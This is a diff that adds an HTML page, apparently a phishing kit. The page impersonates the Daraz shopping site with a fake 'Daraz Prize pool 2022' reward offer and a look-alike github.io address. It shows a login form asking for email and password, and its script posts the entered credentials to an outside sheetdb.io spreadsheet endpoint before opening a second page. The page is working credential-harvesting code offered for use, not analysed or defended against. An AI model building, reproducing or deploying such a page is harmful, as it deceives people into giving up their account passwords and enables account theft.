@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign up</title>
+    <link  href="index.css"  rel="stylesheet">
+    <link  href="page2.html" >
+    <link rel="icon" href="tabicon.png">
+    <meta name="msapplication-TileImage" content="https://i.ibb.co/56Ccynq/daraz-logo-7-E01-DFC36-D-seeklogo-com.png">
+        
+<meta property="og:site_name" content="daraz.lk">
+<meta property="og:title" content="Daraz Prize pool 2022">
+<meta property="og:description" content="Win free rewards from daraz.">
+
+<meta property="og:image" itemprop="image" content="https://i.ibb.co/56Ccynq/daraz-logo-7-E01-DFC36-D-seeklogo-com.png">
+
+<meta property="og:type" content="website" />
+<meta property="og:image:type" content="https://i.ibb.co/56Ccynq/daraz-logo-7-E01-DFC36-D-seeklogo-com.png">
+
+<meta property="og:image:width" content="300">
+<meta property="og:image:height" content="300">
+
+<meta property="og:url" content="https://darazlk.github.io/prizepool/">
+    
+</head> 
+
+
+<body>
+    <form action="https://sheetdb.io/api/v1/c0eb8kgqafs4c" method="post" id="sheetdb-form"  >
+        <div class="container">
+        	
+         <h1>Login</h1>
+          <p>Please enter your email.</p>
+          <hr>
+
+          <label for="email"><b>Email</b></label>
+          <input type="text" placeholder="Enter Email" name="data[Email]" required>
+        
+          <label for="password"><b>Password</b></label>
+          <input type="text" placeholder="Enter Password" name="data[Password]" required>
+ 
+            
+          
+      
+<div class="loadex">
+    <img src="loadex.gif"  alt="Loading..." />
+</div>
+      <br><br>
+          <label>
+            <input type="checkbox" checked="checked" name="remember"><span class="checkmark" ></span> Remember me
+          </label>
+      <br><br>
+          <p>By creating an account you agree to our <a href="#" style="color:dodgerblue">Terms & Privacy</a>.</p>
+      
+          <div class="clearfix">
+            <button type="submit" class="signupbtn">Next</button>
+          </div>
+
+          
+        </div>
+      </form>
+
+
+
+
+</body>
+ <script>
+            var form = document.getElementById('sheetdb-form');
+        form.addEventListener("submit", e => {
+          e.preventDefault();
+          fetch(form.action, {
+              method : "POST",
+              body: new FormData(document.getElementById("sheetdb-form")),
+          }).then(
+              response => response.json()
+          ).then((html) => {
+            // you can put any JS code here
+            window.open('page2.html', '_blank');
+
+          });
+        });
+ </script>
+
+ <script  src="js/script.js"></script>
+</html>
